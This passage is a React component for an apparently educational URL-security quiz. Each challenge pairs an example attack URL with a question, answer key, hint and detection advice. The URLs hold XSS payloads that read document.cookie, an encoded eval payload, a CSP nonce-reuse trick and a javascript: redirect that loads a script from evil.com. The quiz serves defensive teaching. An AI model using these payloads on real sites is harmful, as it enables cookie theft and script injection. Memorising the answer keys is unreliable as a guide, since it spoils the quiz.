  title: "API Abuse Pattern Recognition",
  difficulty: "advanced",
  type: "defense",
  scenario: "Your API endpoints are being probed for sensitive data exposure.",
  url: "https://api.com/users/123?fields=password,ssn,credit_card&include_private=true&admin_view=1",
  question: "What API security pattern should trigger immediate blue team investigation?",
  answer: "Sensitive field enumeration",
  hint: "Look for attempts to access fields that should never be exposed",
  explanation: "Requests for sensitive fields like 'password', 'ssn', 'credit_card' combined with privilege escalation parameters indicate API abuse reconnaissance.",
  safetyNote: "Monitor API field access patterns. Alert on requests for sensitive field names regardless of whether they exist."
},
{
  id: 45,
  title: "Supply Chain Attack URL Indicators",
  difficulty: "expert",
  type: "defense",
  scenario: "You're investigating potential supply chain compromise through URL analysis.",
  url: "https://cdn.legitimate-library.com/v1.2.3/library.js?callback=eval&payload=dmFyIHM9ZG9jdW1lbnQ=",
  question: "What supply chain attack indicator should blue teams detect in this CDN URL?",
  answer: "JSONP callback manipulation",
  hint: "Look at the callback parameter and consider what 'eval' might enable",
  explanation: "Using 'eval' as a JSONP callback with base64 payloads indicates potential supply chain compromise where CDN resources are weaponized for code execution.",
  safetyNote: "Monitor CDN and third-party resource URLs for suspicious callbacks, unexpected parameters, and encoded payloads."
},
{
  id: 46,
  title: "DOM-Based XSS in URL Fragment Detection",
  difficulty: "advanced",
  type: "defense",
  scenario: "Your client-side monitoring detects suspicious JavaScript execution from URL fragments.",
  url: "https://app.com/page#<img src=x onerror=alert(document.cookie)>",
  question: "Why is this DOM XSS attack difficult for traditional server-side monitoring to detect?",
  answer: "Fragments not sent to server",
  hint: "Consider what part of the URL reaches server logs vs. client-side JavaScript",
  explanation: "URL fragments (#...) are processed client-side only. Server logs never see the XSS payload, requiring client-side monitoring or CSP to detect.",
  safetyNote: "Implement client-side security monitoring and Content Security Policy to detect DOM-based XSS that bypasses server-side detection."
},
{
  id: 47,
  title: "Redirect Chain Monitoring for Phishing",
  difficulty: "advanced",
  type: "defense",
  scenario: "Your security team needs to detect multi-hop redirect chains used in phishing campaigns.",
  url: "https://trusted.com/r?url=https://partner.com/go?next=https://lookalike-bank.com/login",
  question: "What blue team technique should track the full redirect destination?",
  answer: "Redirect chain following",
  hint: "You need to follow all redirects to see the final destination",
  explanation: "Blue teams must implement redirect chain following to detect phishing that bounces through multiple trusted domains before reaching malicious destinations.",
  safetyNote: "Implement automated redirect chain analysis in security tools. Attackers use trusted domains as bounce points to evade detection."
},
{
  id: 48,
  title: "CSP Bypass via Reflected XSS Detection",
  difficulty: "expert",
  type: "defense",
  scenario: "Attackers are bypassing your CSP using reflected XSS with specific URL patterns.",
  url: "https://app.com/search?q=<script nonce='+document.querySelector('[nonce]').getAttribute('nonce')+'>alert(1)</script>",
  question: "What CSP bypass technique should blue teams detect in this reflected XSS?",
  answer: "Nonce extraction and reuse",
  hint: "Look at how the script is trying to obtain a valid nonce value",
  explanation: "This attack extracts CSP nonces from the page and reuses them. Blue teams should monitor for JavaScript that accesses nonce attributes.",
  safetyNote: "Monitor for JavaScript accessing nonce attributes or CSP-related DOM properties. Implement strict CSP policies and nonce rotation."
},
{
  id: 49,
  title: "Subdomain Takeover via Redirect Monitoring",
  difficulty: "advanced",
  type: "defense",
  scenario: "Your DNS monitoring notices redirect patterns that might indicate subdomain takeover.",
  url: "https://old-service.company.com/redirect?next=https://attacker-controlled.herokuapp.com/phishing",
  question: "What subdomain security issue should this redirect pattern alert blue teams to investigate?",
  answer: "Subdomain takeover",
  hint: "Consider what happens when old subdomains point to services you no longer control",
  explanation: "Redirects from company subdomains to external services may indicate subdomain takeover, where attackers control abandoned DNS records.",
  safetyNote: "Monitor all company subdomains for unexpected redirects. Implement DNS monitoring and subdomain inventory management."
},
{
  id: 50,
  title: "Filter Evasion XSS Pattern Analysis",
  difficulty: "advanced",
  type: "defense",
  scenario: "Attackers are using advanced XSS filter evasion techniques in URL parameters.",
  url: "https://app.com/page?msg=<svg/onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>",
  question: "What XSS evasion technique combines SVG events with encoding to bypass filters?",
  answer: "SVG onload with base64 encoding",
  hint: "The payload uses SVG events and base64-encoded JavaScript",
  explanation: "SVG onload events with base64-encoded payloads (atob()) can bypass XSS filters that don't decode base64 before analysis.",
  safetyNote: "XSS filters must decode base64 and other encodings before analysis. Monitor for SVG events and encoding functions in URLs."
},
{
  id: 51,
  title: "Open Redirect Reputation Monitoring",
  difficulty: "intermediate",
  type: "defense",
  scenario: "Your security team monitors for domain reputation damage from open redirect abuse.",
  url: "https://yourcompany.com/go?url=https://malware-site.com/download-virus.exe",
  question: "How should blue teams detect when their open redirects are being abused for malware distribution?",
  answer: "Monitor redirect destination reputation",
  hint: "Check where your redirects are sending users using threat intelligence",
  explanation: "Blue teams should monitor redirect destinations against threat intelligence feeds to detect when legitimate redirects are abused for malicious purposes.",
  safetyNote: "Implement real-time threat intelligence checking for redirect destinations. Open redirects can damage domain reputation."
},
{
  id: 52,
  title: "JavaScript Protocol Redirect Detection",
  difficulty: "advanced",
  type: "defense",
  scenario: "Your browser security monitoring detects dangerous protocol usage in redirects.",
  url: "https://app.com/redirect?next=javascript:void(function(){var s=document.createElement('script');s.src='//evil.com/xss.js';document.head.appendChild(s)})();",
  question: "What dangerous protocol should blue team browser monitoring immediately block?",
  answer: "javascript protocol",
  hint: "Look at the protocol scheme at the start of the redirect URL",
  explanation: "JavaScript protocols in redirects enable immediate code execution. Browser monitoring should block javascript:, data:, and vbscript: protocols.",
  safetyNote: "Implement browser-side filtering for dangerous protocols. Block javascript:, data:, vbscript:, and file: protocols in redirects."
},
{
  id: 53,
  title: "XSS Payload Mutation Detection",
  difficulty: "expert",
  type: "defense",
  scenario: "Attackers are using DOM mutations to execute XSS payloads that evade static analysis.",
  url: "https://app.com/search?q=<div id=x></div><script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>",
  question: "What advanced XSS technique requires runtime analysis to detect?",
  answer: "DOM mutation XSS",
  hint: "The XSS payload is created by JavaScript modifying the DOM after page load",
  explanation: "DOM mutation XSS creates malicious content after initial page load, requiring runtime monitoring rather than static source analysis.",
  safetyNote: "Implement runtime DOM monitoring and mutation observers to detect XSS payloads created after page load."
},
{
  id: 54,
  title: "Polyglot XSS Detection Across Contexts",
  difficulty: "expert",
  type: "defense",
  scenario: "Your WAF is facing polyglot XSS payloads that work in multiple contexts.",
  url: "https://app.com/page?data='-alert(1)-'\"<script>alert(1)</script><!--",
  question: "Why are polyglot XSS payloads harder for blue teams to detect than single-context attacks?",
  answer: "Multiple valid contexts",
  hint: "The payload works whether it's in JavaScript strings, HTML attributes, or HTML content",
  explanation: "Polyglot payloads work in multiple contexts (JS, HTML, CSS), making context-aware filtering difficult and requiring comprehensive validation.",
  safetyNote: "Context-aware XSS filtering must analyze all possible execution contexts. Polyglots exploit context-switching vulnerabilities."
},
{
  id: 55,
  title: "Time-Delayed Redirect Attack Detection",
  difficulty: "advanced",
  type: "defense",
  scenario: "Your monitoring system needs to detect redirects that activate after a time delay to evade analysis.",
  url: "https://legitimate.com/redirect?url=https://temp-trusted.com&delay=3600&final=https://malicious.com",
  question: "What blue team technique should detect time-delayed redirect attacks?",
  answer: "Extended session monitoring",
  hint: "The redirect doesn't happen immediately - you need to monitor longer-term behavior",
  explanation: "Time-delayed redirects activate after security scanners finish, requiring extended monitoring and behavioral analysis to detect.",
  safetyNote: "Implement long-term session monitoring and behavioral analysis. Attackers use time delays to evade short-duration security scans."
}
  ];

  // Function to get 5 random challenges
  const getRandomChallenges = () => {
    const shuffled = [...allChallenges].sort(() => Math.random() - 0.5);
    return shuffled.slice(0, 5);
  };

  // Initialize with 5 random challenges
  const [challenges] = useState(() => getRandomChallenges());

  // Error boundary function
  const handleError = (error, context) => {
    console.error(`Error in ${context}:`, error);
    setError(`Error in ${context}: ${error.message}`);
  };

  // Safe challenge getter with error handling
  const getCurrentChallenge = () => {
    try {
      if (currentChallenge < 0 || currentChallenge >= challenges.length) {
        throw new Error(`Invalid challenge index: ${currentChallenge}`);
      }
      return challenges[currentChallenge];
    } catch (error) {
      handleError(error, 'getCurrentChallenge');
      return challenges[0]; // Fallback to first challenge
    }
  };

  const challenge = getCurrentChallenge();

  // Safe answer checking with error handling
  const checkAnswer = () => {
    try {
      if (!challenge || !challenge.answer) {
        throw new Error('Invalid challenge data');
      }
      
      const isCorrect = userAnswer.trim().toLowerCase() === challenge.answer.toLowerCase();
      if (isCorrect) {
        setCompletedChallenges(prev => new Set([...prev, challenge.id]));
        setScore(prev => prev + 1);
      }
      setShowSolution(true);
      setError(null); // Clear any previous errors
    } catch (error) {
      handleError(error, 'checkAnswer');
    }
  };

  // Safe navigation with bounds checking
  const nextChallenge = () => {
    try {
      if (currentChallenge < challenges.length - 1) {
        setCurrentChallenge(prev => prev + 1);
        setUserAnswer('');
        setShowHint(false);
        setShowSolution(false);
        setError(null);
      }
    } catch (error) {
      handleError(error, 'nextChallenge');
    }
  };

  const prevChallenge = () => {
    try {
      if (currentChallenge > 0) {
        setCurrentChallenge(prev => prev - 1);
        setUserAnswer('');
        setShowHint(false);
        setShowSolution(false);
        setError(null);
      }
    } catch (error) {
      handleError(error, 'prevChallenge');
    }
  };

  // Safe reset function
  const resetLab = () => {
    try {
      setCurrentChallenge(0);
      setUserAnswer('');
      setShowHint(false);
      setShowSolution(false);
      setCompletedChallenges(new Set());
      setScore(0);
      setError(null);
    } catch (error) {
      handleError(error, 'resetLab');
    }
  };

  // Safe difficulty color function
  const getDifficultyColor = (difficulty) => {
    try {
      const colors = {
        beginner: isDarkMode ? 'text-green-400 bg-green-900 border-green-700' : 'text-green-700 bg-green-100 border-green-300',
        intermediate: isDarkMode ? 'text-yellow-400 bg-yellow-900 border-yellow-700' : 'text-yellow-700 bg-yellow-100 border-yellow-300',
        advanced: isDarkMode ? 'text-orange-400 bg-orange-900 border-orange-700' : 'text-orange-700 bg-orange-100 border-orange-300',
        expert: isDarkMode ? 'text-red-400 bg-red-900 border-red-700' : 'text-red-700 bg-red-100 border-red-300'
      };
      return colors[difficulty] || colors.beginner;
    } catch (error) {
      handleError(error, 'getDifficultyColor');
      return isDarkMode ? 'text-gray-400 bg-gray-800 border-gray-600' : 'text-gray-600 bg-gray-100 border-gray-300';
    }
  };

  // Safe icon getter
  const getTypeIcon = (type) => {
    try {
      const icons = {
        analysis: EyeIcon,
        identification: LinkIcon,
        construction: CodeBracketIcon,
        security: ExclamationTriangleIcon,
        encoding: GlobeAltIcon,
        theory: BookOpenIcon
      };
      const IconComponent = icons[type] || LinkIcon;
      return <IconComponent className="w-4 h-4" />;
    } catch (error) {
      handleError(error, 'getTypeIcon');
      return <LinkIcon className="w-4 h-4" />;
    }
  };

  // Safe answer comparison
  const isAnswerCorrect = () => {
    try {
      if (!challenge || !challenge.answer) return false;
      return userAnswer.trim().toLowerCase() === challenge.answer.toLowerCase();
    } catch (error) {
      handleError(error, 'isAnswerCorrect');
      return false;
    }
  };

  // Error display component
  if (error) {
    return (
      <div className={`min-h-screen ${isDarkMode ? 'bg-gray-900 text-white' : 'bg-gray-50 text-gray-900'}`}>
        <div className="container mx-auto px-4 py-8 max-w-4xl">
          <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4">
            <strong className="font-bold">Error: </strong>
            <span className="block sm:inline">{error}</span>
            <button 
              onClick={() => setError(null)}
              className="mt-2 bg-red-500 hover:bg-red-700 text-white font-bold py-2 px-4 rounded"
            >
              Try Again
            </button>
          </div>
        </div>
      </div>
    );
  }

  // Loading state
  if (!challenge) {
    return (
      <div className={`min-h-screen ${isDarkMode ? 'bg-gray-900 text-white' : 'bg-gray-50 text-gray-900'}`}>
        <div className="container mx-auto px-4 py-8">
          <div className="text-center">
            <h1 className="text-3xl font-bold mb-4">Loading URL Parameter Lab...</h1>
            <div className="animate-spin rounded-full h-32 w-32 border-b-2 border-blue-600 mx-auto"></div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className={`min-h-screen ${isDarkMode ? 'bg-gray-900 text-white' : 'bg-gray-50 text-gray-900'}`}>
      <div className="container mx-auto px-4 py-8 max-w-6xl">
        
        {/* Header */}
        <div className="text-center mb-8">
          <div className="flex items-center justify-center mb-4">
            <LinkIcon className="w-8 h-8 mr-3 text-blue-600" />
            <h1 className="text-4xl font-bold">URL Parameter Manipulation Lab</h1>
          </div>
          <p className={`text-lg max-w-3xl mx-auto ${isDarkMode ? 'text-gray-300' : 'text-gray-600'}`}>
            Learn about URL structure, parameter manipulation, and web security through hands-on challenges
          </p>
          
          {/* Theme Toggle */}
          <button
            onClick={() => setIsDarkMode(!isDarkMode)}
            className={`mt-4 px-4 py-2 rounded-lg border transition-colors ${
              isDarkMode 
                ? 'bg-gray-800 border-gray-600 hover:bg-gray-700' 
                : 'bg-white border-gray-300 hover:bg-gray-50'
            }`}
          >
            {isDarkMode ? '☀️ Light Mode' : '🌙 Dark Mode'}
          </button>
        </div>

        {/* Tab Navigation */}
        <div className="flex justify-center mb-8">
          <div className={`flex rounded-lg border ${isDarkMode ? 'border-gray-700' : 'border-gray-300'}`}>
            {[
              { id: 'challenge', label: 'Challenge', icon: TrophyIcon },
              { id: 'tutorial', label: 'Tutorial', icon: BookOpenIcon },
              { id: 'reference', label: 'Reference', icon: LinkIcon }
            ].map(tab => (
              <button
                key={tab.id}
                onClick={() => setCurrentTab(tab.id)}
                className={`px-6 py-3 flex items-center space-x-2 transition-colors ${
                  currentTab === tab.id
                    ? (isDarkMode ? 'bg-blue-600 text-white' : 'bg-blue-600 text-white')
                    : (isDarkMode ? 'text-gray-300 hover:bg-gray-700' : 'text-gray-700 hover:bg-gray-100')
                } ${tab.id === 'challenge' ? 'rounded-l-lg' : tab.id === 'reference' ? 'rounded-r-lg' : ''}`}
              >
                <tab.icon className="w-4 h-4" />
                <span>{tab.label}</span>
              </button>
            ))}
          </div>
        </div>

        {/* Challenge Tab */}
        {currentTab === 'challenge' && (
          <>
            {/* Progress Bar */}
            <div className={`mb-8 p-6 rounded-lg border shadow-lg ${
              isDarkMode ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'
            }`}>
              <div className="flex justify-between items-center mb-4">
                <div>
                  <h2 className="text-2xl font-bold">
                    Challenge {Math.min(currentChallenge + 1, challenges.length)} of {challenges.length}
                  </h2>
                  <div className="flex items-center space-x-3 mt-2">
                    <span className={`px-3 py-1 rounded-full text-sm font-medium border ${getDifficultyColor(challenge.difficulty)}`}>
                      {challenge.difficulty ? challenge.difficulty.charAt(0).toUpperCase() + challenge.difficulty.slice(1) : 'Unknown'}
                    </span>
                    <span className={`flex items-center space-x-1 text-sm ${isDarkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                      {getTypeIcon(challenge.type)}
                      <span>{challenge.type || 'unknown'}</span>
                    </span>
                  </div>
                </div>
                <div className="text-right">
                  <div className="text-lg font-semibold">Score: {score}/{challenges.length}</div>
                  <div className={`text-sm ${isDarkMode ? 'text-gray-400' : 'text-gray-600'}`}>
                    Completed: {completedChallenges.size}
                  </div>
                </div>
              </div>
              
              <div className={`w-full bg-gray-200 rounded-full h-3 ${isDarkMode ? 'bg-gray-700' : ''}`}>
                <div 
                  className="bg-blue-600 h-3 rounded-full transition-all duration-300"
                  style={{ width: `${Math.min(((currentChallenge + 1) / challenges.length) * 100, 100)}%` }}
                ></div>
              </div>
            </div>

            {/* Challenge Content */}
            <div className={`mb-8 p-8 rounded-lg border shadow-lg ${
              isDarkMode ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'
            }`}>
              <h3 className="text-2xl font-bold mb-4">{challenge.title || 'Untitled Challenge'}</h3>
              
              {/* Scenario */}
              <div className={`mb-6 p-4 rounded-lg border-l-4 border-blue-500 ${
                isDarkMode ? 'bg-blue-900/20' : 'bg-blue-50'
              }`}>
                <h4 className="font-semibold mb-2">Scenario:</h4>
                <p className={isDarkMode ? 'text-gray-300' : 'text-gray-700'}>
                  {challenge.scenario || 'No scenario provided'}
                </p>
              </div>

              {/* URL Display */}
              <div className={`mb-6 p-4 rounded-lg border ${
                isDarkMode ? 'bg-gray-700 border-gray-600' : 'bg-gray-100 border-gray-300'
              }`}>
                <h4 className="font-semibold mb-2">URL to Analyze:</h4>
                <div className={`font-mono text-sm break-all p-2 rounded ${
                  isDarkMode ? 'bg-gray-600 text-green-400' : 'bg-white text-green-700'
                }`}>
                  {challenge.url || 'No URL provided'}
                </div>
              </div>

              {/* Question */}
              <div className="mb-6">
                <h4 className="font-semibold mb-2 text-lg">Question:</h4>
                <p className={`text-lg ${isDarkMode ? 'text-gray-300' : 'text-gray-700'}`}>
                  {challenge.question || 'No question provided'}
                </p>
              </div>

              {/* Answer Input */}
              <div className="mb-6">
                <label className={`block text-sm font-medium mb-2 ${isDarkMode ? 'text-gray-300' : 'text-gray-700'}`}>
                  Your Answer:
                </label>
                <input
                  type="text"
                  value={userAnswer}
                  onChange={(e) => setUserAnswer(e.target.value)}
                  onKeyPress={(e) => e.key === 'Enter' && !showSolution && checkAnswer()}
                  placeholder="Enter your answer here..."
                  disabled={showSolution}
                  className={`w-full px-4 py-3 rounded-lg border transition-colors ${
                    isDarkMode 
                      ? 'bg-gray-700 border-gray-600 text-white placeholder-gray-400 focus:border-blue-500' 
                      : 'bg-white border-gray-300 text-gray-900 placeholder-gray-500 focus:border-blue-500'
                  } focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-50`}
                />
              </div>

              {/* Action Buttons */}
              <div className="flex flex-wrap gap-3 mb-6">
                {!showSolution ? (
                  <>
                    <button
                      onClick={checkAnswer}
                      disabled={!userAnswer.trim()}
                      className={`px-6 py-3 rounded-lg font-medium transition-colors ${
                        userAnswer.trim()
                          ? 'bg-blue-600 hover:bg-blue-700 text-white shadow-lg'
                          : (isDarkMode ? 'bg-gray-700 text-gray-400 cursor-not-allowed' : 'bg-gray-300 text-gray-500 cursor-not-allowed')
                      }`}
                    >
                      Check Answer
                    </button>
                    <button
                      onClick={() => setShowHint(!showHint)}
                      className={`px-6 py-3 rounded-lg font-medium border transition-colors ${
                        isDarkMode 
                          ? 'border-gray-600 text-gray-300 hover:bg-gray-700' 
                          : 'border-gray-300 text-gray-700 hover:bg-gray-50'
                      }`}
                    >
                      <LightBulbIcon className="w-4 h-4 inline mr-2" />
                      {showHint ? 'Hide Hint' : 'Show Hint'}
                    </button>
                  </>
                ) : (
                  <div className="flex space-x-3">
                    <button
                      onClick={nextChallenge}
                      disabled={currentChallenge >= challenges.length - 1}
                      className={`px-6 py-3 rounded-lg font-medium transition-colors ${
                        currentChallenge < challenges.length - 1
                          ? 'bg-green-600 hover:bg-green-700 text-white shadow-lg'
                          : (isDarkMode ? 'bg-gray-700 text-gray-400 cursor-not-allowed' : 'bg-gray-300 text-gray-500 cursor-not-allowed')
                      }`}
                    >
                      Next Challenge
                      <ChevronRightIcon className="w-4 h-4 inline ml-2" />
                    </button>
                  </div>
                )}
              </div>

              {/* Navigation */}
              <div className="flex justify-between">
                <button
                  onClick={prevChallenge}
                  disabled={currentChallenge === 0}
                  className={`px-4 py-2 rounded-lg border transition-colors ${
                    currentChallenge > 0
                      ? (isDarkMode ? 'border-gray-600 text-gray-300 hover:bg-gray-700' : 'border-gray-300 text-gray-700 hover:bg-gray-50')
                      : (isDarkMode ? 'border-gray-700 text-gray-500 cursor-not-allowed' : 'border-gray-200 text-gray-400 cursor-not-allowed')
                  }`}
                >
                  <ChevronLeftIcon className="w-4 h-4 inline mr-2" />
                  Previous
                </button>
                <button
                  onClick={resetLab}
                  className={`px-4 py-2 rounded-lg border transition-colors ${
                    isDarkMode 
                      ? 'border-gray-600 text-gray-300 hover:bg-gray-700' 
                      : 'border-gray-300 text-gray-700 hover:bg-gray-50'
                  }`}
                >
                  🔄 Reset Lab
                </button>
              </div>

              {/* Hint Section */}
              {showHint && challenge.hint && (
                <div className={`mt-6 p-4 rounded-lg border-l-4 border-yellow-500 ${
                  isDarkMode ? 'bg-yellow-900/20' : 'bg-yellow-50'
                }`}>
                  <div className="flex items-start">
                    <LightBulbIcon className="w-5 h-5 text-yellow-500 mr-2 mt-0.5 flex-shrink-0" />
                    <div>
                      <h4 className="font-medium text-yellow-700 dark:text-yellow-300 mb-1">Hint:</h4>
                      <p className={isDarkMode ? 'text-yellow-200' : 'text-yellow-700'}>{challenge.hint}</p>
                    </div>
                  </div>
                </div>
              )}

              {/* Solution Section */}
              {showSolution && (
                <div className={`mt-6 p-6 rounded-lg border ${
                  isAnswerCorrect()
                    ? (isDarkMode ? 'bg-green-900/20 border-green-400' : 'bg-green-50 border-green-200')
                    : (isDarkMode ? 'bg-red-900/20 border-red-400' : 'bg-red-50 border-red-200')
                }`}>
                  <div className="flex items-start mb-4">
                    {isAnswerCorrect() ? (
                      <CheckCircleIcon className="w-6 h-6 text-green-500 mr-3 mt-0.5 flex-shrink-0" />
                    ) : (
                      <XCircleIcon className="w-6 h-6 text-red-500 mr-3 mt-0.5 flex-shrink-0" />
                    )}
                    <div className="flex-1">
                      <h4 className={`font-bold text-lg mb-2 ${
                        isAnswerCorrect()
                          ? 'text-green-700 dark:text-green-300'
                          : 'text-red-700 dark:text-red-300'
                      }`}>
                        {isAnswerCorrect() ? 'Correct!' : 'Incorrect'}
                      </h4>
                      <div className={`mb-3 ${isDarkMode ? 'text-gray-300' : 'text-gray-700'}`}>
                        <strong>Correct Answer:</strong> <code className={`px-2 py-1 rounded ${
                          isDarkMode ? 'bg-gray-700' : 'bg-gray-100'
                        }`}>{challenge.answer || 'No answer provided'}</code>
                      </div>
                      {!isAnswerCorrect() && (
                        <div className={`mb-3 ${isDarkMode ? 'text-gray-300' : 'text-gray-700'}`}>
                          <strong>Your Answer:</strong> <code className={`px-2 py-1 rounded ${
                            isDarkMode ? 'bg-gray-700' : 'bg-gray-100'
                          }`}>{userAnswer}</code>
                        </div>
                      )}
                      <div className={isDarkMode ? 'text-gray-300' : 'text-gray-700'}>
                        <strong>Explanation:</strong> {challenge.explanation || 'No explanation provided'}
                      </div>
                    </div>
                  </div>
                  
                  {/* Safety Note */}
                  {challenge.safetyNote && (
                    <div className={`mt-4 p-3 rounded-lg border-l-4 border-orange-500 ${
                      isDarkMode ? 'bg-orange-900/20' : 'bg-orange-50'
                    }`}>
                      <div className="flex items-start">
                        <ExclamationTriangleIcon className="w-5 h-5 text-orange-500 mr-2 mt-0.5 flex-shrink-0" />
                        <div>
                          <h5 className="font-medium text-orange-700 dark:text-orange-300 mb-1">Safety Note:</h5>
                          <p className={`text-sm ${isDarkMode ? 'text-orange-200' : 'text-orange-700'}`}>
                            {challenge.safetyNote}
                          </p>
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              )}
            </div>
          </>
        )}

        {/* Simple Tutorial Tab */}
        {currentTab === 'tutorial' && (
          <div className={`p-8 rounded-lg border shadow-lg ${
            isDarkMode ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'
          }`}>
            <h2 className="text-3xl font-bold mb-6">URL Parameter Tutorial</h2>
            <p className={`text-lg ${isDarkMode ? 'text-gray-300' : 'text-gray-700'}`}>
              Learn about URL structure, parameters, and security considerations through our interactive challenges.
              Start with the Challenge tab to begin your learning journey!
            </p>
          </div>
        )}

        {/* Simple Reference Tab */}
        {currentTab === 'reference' && (
          <div className={`p-8 rounded-lg border shadow-lg ${
            isDarkMode ? 'bg-gray-800 border-gray-700' : 'bg-white border-gray-200'
          }`}>
            <h2 className="text-3xl font-bold mb-6">Quick Reference</h2>
            <div className={`p-4 rounded-lg ${isDarkMode ? 'bg-gray-700' : 'bg-gray-100'}`}>
              <h4 className="font-semibold mb-2">URL Structure:</h4>
              <code className="text-sm">
                https://benyeogorosenwe.com/path?param1=value1&param2=value2#fragment
              </code>
            </div>
          </div>
        )}

        {/* Footer */}
        <div className="mt-8 text-center">
          <p className={`text-sm ${isDarkMode ? 'text-gray-400' : 'text-gray-600'}`}>
            Learn URL parameter manipulation safely • Always get permission before testing • Practice ethical hacking
          </p>
        </div>
      </div>
      <Footer />
    </div>
  );
};

export default URLParameterLab;